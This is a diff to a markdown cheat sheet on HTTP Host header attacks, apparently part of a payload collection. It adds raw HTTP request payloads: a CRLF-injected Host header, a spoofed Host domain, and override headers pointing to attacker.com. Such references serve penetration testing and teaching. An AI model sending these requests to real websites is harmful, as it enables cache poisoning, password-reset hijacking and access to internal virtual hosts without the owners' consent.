@@ -9,13 +9,25 @@ HTTP Host header attacks exploit vulnerable websites that handle the value of th
 * Allow access to virtual hosts that were not intended to be externally accessible.
 
 ## How to exploit
-* Change the host header
+*  Send a request with a malicious Host header value
+ ```html
+GET /index.html HTTP/1.1
+Host: www.example.com%0d%0aX-Forwarded-For: 192.168.1.1
+...
+```
+* Send a request with a spoofed Host header value
+```html
+GET /index.html HTTP/1.1
+Host: www.example.com.attacker.com
+...
+```
+* Change the Host header
 ```html
 GET /example HTTP/1.1
 Host: attacker.com
 ...
 ```
-* Duplicating the host header
+* Duplicating the Host header
 ```html
 GET /example HTTP/1.1
 Host: vulnerable-website.com
@@ -39,7 +51,7 @@ X-Remote-Addr: attacker.com
 X-Host: attacker.com
 Forwarded: attacker.com
 
-# How to use? In this case im using "X-Forwarded-For : attacker.com"
+# How to use? In this case I using "X-Forwarded-For : attacker.com"
 GET /example HTTP/1.1
 Host: vulnerable-website.com
 X-Forwarded-For : attacker.com
@@ -50,9 +62,3 @@ GET https://vulnerable-website.com/ HTTP/1.1
 Host: attacker.com
 ...
 ```
-
-
-
-
-
-
